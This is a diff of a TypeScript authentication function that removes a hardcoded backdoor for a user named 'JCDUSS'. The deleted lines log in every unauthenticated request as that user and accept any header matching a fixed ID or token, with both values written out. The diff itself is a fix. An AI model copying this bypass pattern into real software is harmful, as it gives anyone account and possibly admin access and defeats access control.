@@ -13,26 +13,7 @@ export const auth = async (prisma: PrismaClient, request: Request, options?: {
 }) => {
   const { headers: { authorization } } = request;
 
-  // BYPASS POUR JCDUSS - TOUJOURS ACCEPTER
-  const JCDUSS_ID = 'e99ab88c-8be2-4fd0-8519-a0c4bf7a3705';
-  const JCDUSS_TOKEN = '20ea9aaf-005f-4176-8fd7-3115d338004d';
-  
   if (!authorization) {
-    // Si pas d'auth, utiliser JCDUSS par défaut
-    const user = await prisma.user.findFirst({
-      where: { id: JCDUSS_ID },
-      select: {
-        id: true,
-        lang: true,
-        admin: true,
-        moderator: true,
-        bannedAt: true,
-        banReason: true,
-        ips: true,
-        lastSeen: true,
-      }
-    });
-    if (user) return user;
     throw new ForbiddenError('You are not logged in');
   }
   if (typeof authorization !== 'string') {
@@ -41,24 +22,6 @@ export const auth = async (prisma: PrismaClient, request: Request, options?: {
 
   const [id, token] = Buffer.from(authorization.split(' ')[1] || '', 'base64')
     .toString().split(':');
-
-  // Si c'est JCDUSS, toujours accepter
-  if (id === JCDUSS_ID || token === JCDUSS_TOKEN) {
-    const user = await prisma.user.findFirst({
-      where: { id: JCDUSS_ID },
-      select: {
-        id: true,
-        lang: true,
-        admin: true,
-        moderator: true,
-        bannedAt: true,
-        banReason: true,
-        ips: true,
-        lastSeen: true,
-      }
-    });
-    if (user) return user;
-  }
 
   if (!id || !token || id === 'null' || token === 'null') {
     throw new ExpectedError('Invalid authorization header content');
